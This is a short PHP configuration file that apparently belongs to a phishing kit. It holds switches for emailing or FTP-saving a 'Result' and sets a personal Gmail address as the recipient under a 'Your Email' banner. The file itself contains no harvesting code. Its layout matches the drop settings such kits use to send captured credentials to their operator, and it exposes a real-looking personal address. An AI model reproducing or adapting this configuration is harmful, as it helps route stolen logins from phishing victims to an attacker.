<?php


/*

 */




/*
Option Send Email :
1 : Send Email.
0 : Don't Send Email.
Option Ftp Write
1 : FTP Write.
0 : Don't FTP Save Result.
*/
$Send_Email = 1;
$Ftp_Write = 0;
//   <============================= Your Email =============================>
$to      = 'gredadridi@gmail.com';
//   <============================= Your Email =============================>



?>